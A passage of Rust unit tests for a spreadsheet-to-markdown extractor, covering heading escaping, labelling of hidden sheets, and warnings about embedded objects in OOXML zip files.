            !first_line.contains("[Q1]") || first_line.contains("\\["),
            "unescaped markdown link syntax in heading: {:?}",
            first_line
        );
        assert!(pages[0].content.starts_with("## "), "content must start with H2 marker");
        assert!(pages[0].content.contains("Profit"));
    }

    /// xberg-io/xberg#119: a sheet named in the `hidden_sheets` workbook-metadata
    /// entry gets `" (hidden)"` appended to its heading, while a visible sheet's
    /// heading is untouched; its content is still fully present either way.
    #[test]
    fn should_mark_hidden_sheet_heading_but_keep_its_content() {
        let mut workbook = make_workbook(vec![
            make_sheet("Visible", Some(vec![vec!["A".to_string()]])),
            make_sheet("Hidden", Some(vec![vec!["Secret".to_string()]])),
        ]);
        workbook
            .metadata
            .insert("hidden_sheets".to_string(), "Hidden".to_string());

        let doc = ExcelExtractor::build_internal_document(&workbook);
        let pages = doc.prebuilt_pages.as_ref().unwrap();

        assert!(pages[0].content.starts_with("## Visible\n"), "{:?}", pages[0].content);
        assert!(
            pages[1].content.starts_with("## Hidden (hidden)\n"),
            "{:?}",
            pages[1].content
        );
        assert!(pages[1].content.contains("Secret"), "hidden sheet content must survive");
    }

    #[test]
    fn should_treat_no_sheets_as_hidden_when_metadata_key_is_absent() {
        let workbook = make_workbook(vec![make_sheet("Sheet1", Some(vec![vec!["A".to_string()]]))]);
        let doc = ExcelExtractor::build_internal_document(&workbook);
        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert!(pages[0].content.starts_with("## Sheet1\n"), "{:?}", pages[0].content);
    }

    #[cfg(feature = "office")]
    fn make_zip_with_entry(entry_path: &str, entry_data: &[u8]) -> Vec<u8> {
        use std::io::{Cursor, Write};
        let buf = Cursor::new(Vec::new());
        let mut zip = zip::ZipWriter::new(buf);
        let options = zip::write::FileOptions::<()>::default().compression_method(zip::CompressionMethod::Stored);
        zip.start_file(entry_path, options).unwrap();
        zip.write_all(entry_data).unwrap();
        zip.finish().unwrap().into_inner()
    }

    /// xberg-io/xberg#78: an OOXML zip carrying files under `xl/embeddings/`
    /// must be flagged, naming the embedded file, on the sync (WASM) path that
    /// cannot recurse into them.
    #[cfg(feature = "office")]
    #[test]
    fn should_warn_about_embedded_objects_on_sync_path() {
        let bytes = make_zip_with_entry("xl/embeddings/Workbook1.xlsx", b"fake embedded workbook bytes");
        let warning = scan_for_embedded_objects(
            &bytes,
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        )
        .expect("embedded object under xl/embeddings/ must produce a warning");
        assert_eq!(warning.source, "excel");
        assert_eq!(
            warning.message,
            "Workbook contains 1 embedded object that were not extracted (xl/embeddings/Workbook1.xlsx)"
        );
    }

    #[cfg(feature = "office")]
    #[test]
    fn should_not_warn_when_no_embedded_objects_present() {
        let bytes = make_zip_with_entry("xl/worksheets/sheet1.xml", b"<worksheet/>");
        assert!(
            scan_for_embedded_objects(
                &bytes,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet"
            )
            .is_none()
        );
    }

    #[cfg(feature = "office")]
    #[test]
    fn should_not_scan_non_ooxml_zip_mime_types_for_embedded_objects() {
        let bytes = make_zip_with_entry("xl/embeddings/Object1.bin", b"data");
        assert!(scan_for_embedded_objects(&bytes, "application/vnd.ms-excel").is_none());
    }
}
